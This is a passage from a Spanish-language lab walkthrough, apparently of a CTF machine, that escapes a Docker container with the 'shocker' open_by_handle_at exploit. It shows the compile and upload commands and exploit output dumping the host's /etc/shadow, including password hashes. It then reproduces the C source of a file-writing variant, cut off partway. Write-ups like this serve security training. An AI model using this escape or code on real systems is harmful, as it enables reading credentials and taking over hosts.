<p><strong>Funciones Clave</strong>:</p>
<ul>
<li><code>die(const char *msg)</code>: Muestra un mensaje de error y termina el programa.</li>
<li><code>dump_handle(const struct my_file_handle *h)</code>: Imprime los detalles de un identificador de archivo.</li>
<li><code>find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)</code>:
<ul>
<li>Recursivamente encuentra el identificador de un archivo basado en un camino (<code>path</code>) dado.</li>
<li>Utiliza <code>open_by_handle_at</code> para abrir directorios y archivos mediante identificadores.</li>
<li>Realiza una búsqueda exhaustiva (brute force) para encontrar el identificador correcto del archivo deseado.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Función Principal (<code>main</code>)</strong>:</p>
<ul>
<li>Imprime un mensaje de introducción indicando que es un exploit.</li>
<li>Espera una entrada del usuario para continuar.</li>
<li>Abre <code>/etc/hostname</code> para obtener una referencia a un archivo del host. Este archivo debe estar montado dentro del contenedor.</li>
<li>Usa <code>find_handle</code> para encontrar el identificador del archivo especificado en <code>argv[1]</code> (por ejemplo, <code>/etc/shadow</code>).</li>
<li>Si encuentra un identificador válido, abre el archivo con <code>open_by_handle_at</code>.</li>
<li>Lee el contenido del archivo y lo guarda en un buffer.</li>
<li>Escribe el contenido del buffer en un archivo especificado en <code>argv[2]</code> (por ejemplo, <code>shadow</code>).</li>
<li>Cierra los archivos y termina.</li>
</ul>
</li>
</ol>
<h3 id="requisitos-para-que-el-exploit-funcione">Requisitos para que el Exploit Funcione</h3>
<ol>
<li>
<p><strong>Montaje del Sistema de Archivos del Host</strong>:</p>
<ul>
<li>El contenedor debe tener acceso a un archivo del sistema de archivos del host que esté montado dentro del contenedor. En este caso, se usa <code>/etc/hostname</code>.</li>
</ul>
</li>
<li>
<p><strong>Privilegios y Capacidades del Contenedor</strong>:</p>
<ul>
<li>El contenedor debe tener suficientes privilegios para usar <code>open_by_handle_at</code>. Esto generalmente requiere que el contenedor tenga capacidades elevadas, como <code>CAP_DAC_READ_SEARCH</code>, <code>CAP_SYS_ADMIN</code> y <code>CAP_DAC_OVERRIDE</code>.</li>
<li>El contenedor debe poder usar <code>fdopendir</code>, <code>readdir</code> y otras llamadas del sistema relacionadas con la manipulación de directorios y archivos.</li>
</ul>
</li>
<li>
<p><strong>Kernel del Sistema Operativo</strong>:</p>
<ul>
<li>El sistema operativo del host debe soportar la llamada al sistema <code>open_by_handle_at</code>, que es una característica específica de kernels de Linux.</li>
</ul>
</li>
<li>
<p><strong>Sin Restricciones de Seguridad Adicionales</strong>:</p>
<ul>
<li>No debe haber restricciones de seguridad adicionales que impidan el acceso a <code>open_by_handle_at</code> desde el contenedor. Esto incluye configuraciones de seguridad como SELinux, AppArmor u otras políticas de seguridad que podrían bloquear estas operaciones.</li>
</ul>
</li>
</ol>
<p>Una vez tenemos este script en nuestra máquina de atacante, tenemos que modificar el script para indicar que archivo queremos abrir como referencia, para que el script sepa que la máquina es vulnerable.
<img src="images/Screenshot_27.png" alt="Write-up Image"></p>
<p>En mi caso, vamos a elegir el <code>/etc/hosts</code> ya que como la máquina víctima es linux, sabemos que existe este archivo.
<img src="images/Screenshot_28.png" alt="Write-up Image"></p>
<p>Ahora compilamos el script.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> gcc -Wall -std<span style="color:#f92672">=</span>c99 -O2 shocker.c -static -o shocker
</span></span></code></pre></div><p>Lo subimos a la máquina víctima</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>local<span style="color:#f92672">)</span> pwncat$ upload shocker /tmp/shocker
</span></span><span style="display:flex;"><span>/tmp/shocker ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 767.1/767.1 KB • ? • 0:00:00
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>23:21:17<span style="color:#f92672">]</span> uploaded 767.10KiB in 0.77 seconds
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> root@c150397ccd63:/tmp# ./shocker /etc/hosts hosts
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>***<span style="color:#f92672">]</span> docker VMM-container breakout Po<span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2014</span>             <span style="color:#f92672">[</span>***<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>***<span style="color:#f92672">]</span> The tea from the 90<span style="color:#e6db74">&#39;s kicks your sekurity again.     [***]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[***] If you have pending sec consulting, I&#39;</span>ll happily     <span style="color:#f92672">[</span>***<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>***<span style="color:#f92672">]</span> forward to my friends who drink secury-tea too!      <span style="color:#f92672">[</span>***<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Resolving <span style="color:#e6db74">&#39;etc/shadow&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found lib32
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ..
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found lost+found
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found sbin
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found bin
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found boot
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found dev
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found run
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found lib64
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found var
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found home
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found media
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found proc
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found etc
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Match: etc ino<span style="color:#f92672">=</span><span style="color:#ae81ff">393217</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Brute forcing remaining 32bit. This can take a <span style="color:#66d9ef">while</span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>etc<span style="color:#f92672">)</span> Trying: 0x00000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#75715e">#=8, 1, char nh[] = {0x01, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Resolving <span style="color:#e6db74">&#39;shadow&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found modules-load.d
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found lsb-release
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found rsyslog.conf
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found rc6.d
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found calendar
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found fstab
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found shadow
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Match: shadow ino<span style="color:#f92672">=</span><span style="color:#ae81ff">393228</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Brute forcing remaining 32bit. This can take a <span style="color:#66d9ef">while</span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>shadow<span style="color:#f92672">)</span> Trying: 0x00000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#75715e">#=8, 1, char nh[] = {0x0c, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Got a final handle!
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#75715e">#=8, 1, char nh[] = {0x0c, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Win! /etc/shadow output follows:
</span></span><span style="display:flex;"><span>root:$6$9GrOpvcijuCP93rg$tkcyh.ZwH5w9AHrm66awD9nLzMHv32QqZYGiIfuLow4V1PBkY0xsKoyZnM3.AI.yGWfFLOFDSKsIR9XnKLbIY1:19066:0:99999:7:::
</span></span><span style="display:flex;"><span>daemon:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>bin:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>sys:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>sync:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>games:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>man:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>lp:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>mail:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>news:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>uucp:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>proxy:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>www-data:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>backup:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>list:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>irc:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>gnats:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>nobody:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-network:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-resolve:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-timesync:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>messagebus:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>syslog:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>_apt:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>tss:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>uuidd:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>tcpdump:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>landscape:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>pollinate:*:18659:0:99999:7:::
</span></span><span style="display:flex;"><span>usbmux:*:18849:0:99999:7:::
</span></span><span style="display:flex;"><span>sshd:*:18849:0:99999:7:::
</span></span><span style="display:flex;"><span>systemd-coredump:!!:18849::::::
</span></span><span style="display:flex;"><span>lxd:!:18849::::::
</span></span><span style="display:flex;"><span>saul:$6$19rUyMaBLt7.CDGj$ik84VX1CUhhuiMHxq8hSMjKTDMxHt.ldQC15vFyupafquVyonyyb3/S6MO59tnJHP9vI5GMvbE9T4TFeeeKyg1:19058:0:99999:7:::
</span></span></code></pre></div><p>¡Y perfecto!</p>
<p>Ahora podríamos modificar el archivo que intenta abrir el script, para ver la flag de superusuario.
<img src="images/Screenshot_29.png" alt="Write-up Image"></p>
<p>Compilamos el binario, lo subimos, lo ejecutamos y&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> root@c150397ccd63:/tmp# ./shocker 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>***<span style="color:#f92672">]</span> docker VMM-container breakout Po<span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2014</span>             <span style="color:#f92672">[</span>***<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>***<span style="color:#f92672">]</span> The tea from the 90<span style="color:#e6db74">&#39;s kicks your sekurity again.     [***]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[***] If you have pending sec consulting, I&#39;</span>ll happily     <span style="color:#f92672">[</span>***<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>***<span style="color:#f92672">]</span> forward to my friends who drink secury-tea too!      <span style="color:#f92672">[</span>***<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Resolving <span style="color:#e6db74">&#39;root/root.txt&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found lib32
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ..
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found lost+found
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found sbin
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found bin
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found boot
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found dev
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found run
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found lib64
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found var
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found home
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found media
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found proc
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found etc
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found lib
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found libx32
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found cdrom
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found root
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Match: root ino<span style="color:#f92672">=</span><span style="color:#ae81ff">18</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Brute forcing remaining 32bit. This can take a <span style="color:#66d9ef">while</span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> Trying: 0x00000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#75715e">#=8, 1, char nh[] = {0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Resolving <span style="color:#e6db74">&#39;root.txt&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ..
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .backup
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .config
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .cache
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .local
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .ssh
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .profile
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found .bashrc
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found root.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Match: root.txt ino<span style="color:#f92672">=</span><span style="color:#ae81ff">110097</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Brute forcing remaining 32bit. This can take a <span style="color:#66d9ef">while</span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>root.txt<span style="color:#f92672">)</span> Trying: 0x00000000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#75715e">#=8, 1, char nh[] = {0x11, 0xae, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Got a final handle!
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#75715e">#=8, 1, char nh[] = {0x11, 0xae, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Win! /etc/shadow output follows:
</span></span><span style="display:flex;"><span>5f8e5df33844d437...
</span></span></code></pre></div><p>¡Y podemos leer la flag!</p>
<p>A mi este tipo de cosas no me gusta, por lo cual quiero ganar una consola interactiva en la máquina víctima.</p>
<p>En HackTricks, podemos ver un script modificado que nos permitiría escribir archivos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;errno.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dirent.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// gcc shocker_write.c -o shocker_write
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ./shocker_write /etc/passwd passwd 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> my_file_handle {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> handle_bytes;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> handle_type;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> f_handle[<span style="color:#ae81ff">8</span>];
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">die</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> msg) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">perror</span>(msg);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">exit</span>(errno);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">dump_handle</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> my_file_handle <span style="color:#f92672">*</span> h) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[*] #=%d, %d, char nh[] = {&#34;</span>, h <span style="color:#f92672">-&gt;</span> handle_bytes,
</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">-&gt;</span> handle_type);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> h <span style="color:#f92672">-&gt;</span> handle_bytes; <span style="color:#f92672">++</span>i) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;0x%02x&#34;</span>, h <span style="color:#f92672">-&gt;</span> f_handle[i]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">20</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">&lt;</span> h <span style="color:#f92672">-&gt;</span> handle_bytes <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;, &#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;};</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">find_handle</span>(<span style="color:#66d9ef">int</span> bfd, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>path, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> my_file_handle <span style="color:#f92672">*</span>ih, <span style="color:#66d9ef">struct</span> my_file_handle <span style="color:#f92672">*</span>oh)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> fd;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint32_t</span> ino <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> my_file_handle outh <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    .handle_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>,
</span></span><span style="display:flex;"><span>    .handle_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>  };
</span></span><span style="display:flex;"><span>  DIR <span style="color:#f92672">*</span> dir <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> dirent <span style="color:#f92672">*</span> de <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  path <span style="color:#f92672">=</span> <span style="color:#a6e22e">strchr</span>(path, <span style="color:#e6db74">&#39;/&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// recursion stops if path has been resolved
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>path) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(oh <span style="color:#f92672">-&gt;</span> f_handle, ih <span style="color:#f92672">-&gt;</span> f_handle, <span style="color:#66d9ef">sizeof</span>(oh <span style="color:#f92672">-&gt;</span> f_handle));
</span></span><span style="display:flex;"><span>    oh <span style="color:#f92672">-&gt;</span> handle_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    oh <span style="color:#f92672">-&gt;</span> handle_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">++</span>path;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[*] Resolving &#39;%s&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, path);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open_by_handle_at</span>(bfd, (<span style="color:#66d9ef">struct</span> file_handle <span style="color:#f92672">*</span> ) ih, O_RDONLY)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;[-] open_by_handle_at&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((dir <span style="color:#f92672">=</span> <span style="color:#a6e22e">fdopendir</span>(fd)) <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">die</span>(<span style="color:#e6db74">&#34;[-] fdopendir&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (;;) {
</span></span><span style="display:flex;"><span>    de <span style="color:#f92672">=</span> <span style="color:#a6e22e">readdir</span>(dir);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>de)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[*] Found %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, de <span style="color:#f92672">-&gt;</span> d_name);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>(de <span style="color:#f92672">-&gt;</span> d_name, path, <span style="color:#a6e22e">strlen</span>(de <span style="color:#f92672">-&gt;</span> d_name)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[+] Match: %s ino=%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, de <span style="color:#f92672">-&gt;</span> d_name, (<span style="color:#66d9ef">int</span>) de <span style="color:#f92672">-&gt;</span> d_ino);
</span></span><span style="display:flex;"><span>      ino <span style="color:#f92672">=</span> de <span style="color:#f92672">-&gt;</span> d_ino;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
